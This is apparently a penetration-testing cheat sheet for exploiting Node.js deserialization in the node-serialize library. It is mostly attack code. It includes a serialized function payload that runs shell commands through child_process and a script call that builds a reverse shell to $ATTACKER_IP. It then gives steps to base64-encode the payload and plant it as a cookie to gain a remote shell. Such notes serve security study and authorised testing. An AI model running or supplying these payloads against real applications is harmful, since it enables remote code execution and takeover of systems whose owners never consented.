# Deserialization

##

## Node.js

{% code overflow="wrap" fullWidth="true" %}
```javascript
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

curl -sL https://deb.nodesource.com/setup10x | sudo -E bash -
apt install nodejs npm -y
npm install node-serialize
Node.js - Security-Course --> reverse shell NodeJS

# First check if there is a cookie that can be decoded and reencoded with new user/data and that info is reflected on the response

serialize.js
var y = {
	rce : function(){
	require('child_process').exec('whoami', function(error,stdout,stderr) { console.log(stdout) });
	}(), 
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

node serialize.js

userialize.js
var serialize = require('node-serialize')
var payload = 'SERIALIZED_PAYLOAD' # Escape simple quotes
serialize.unserialize(payload)

node unserialize.js
userialize.js
var serialize = require('node-serialize')
var payload = 'SERIALIZED_PAYLOAD' # Escape simple quotes
serialize.unserialize(payload)

# RCE
https://github.com/carnal0wnage/exploits-1/blob/master/nodejsshell.py
python nodejsshell.py $ATTACKER_IP $PORT
# Copy the output and then include it on the new file unserialize.js (rename as data for example, it is not JS anymore)
{"rce":"_$$ND_FUNC$$_function(){$EXPLOIT_OUTPUT}()"}
cat data | base64 -w 0 | echo
# Copy that enconded cookie and replace the other to get a revshell
```
{% endcode %}
